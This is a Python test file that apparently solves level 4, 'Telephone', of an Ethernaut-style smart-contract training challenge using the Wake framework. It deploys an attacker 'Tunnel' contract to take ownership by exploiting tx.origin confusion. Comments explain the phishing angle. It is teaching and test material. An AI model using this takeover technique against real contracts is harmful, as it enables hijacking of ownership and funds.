from wake.testing import *
from tests.level_service import LevelService
from pytypes.contracts.i04_telephone import Telephone
from pytypes.contracts.attacker.i04_tunnel import Tunnel

@default_chain.connect()
def test_level_04():
    service = LevelService(default_chain)
    contract = service.deploy_level_04()
    do_level_04_solution(contract)
    service.check_level_04(contract)
    
def do_level_04_solution(contract: Telephone):
    # Problem: tx.origin is not changed in redirect => can be used for phissing attack
    # Training: difference between tx.origin and tx.sender
    #   In a simple call chain A->B->C->D
    #        inside D msg.sender will be C, and tx.origin will be A
    #        inside C msg.sender will be B, and tx.origin will be A
    tunnel = Tunnel.deploy()
    tunnel.changeOwner(contract)
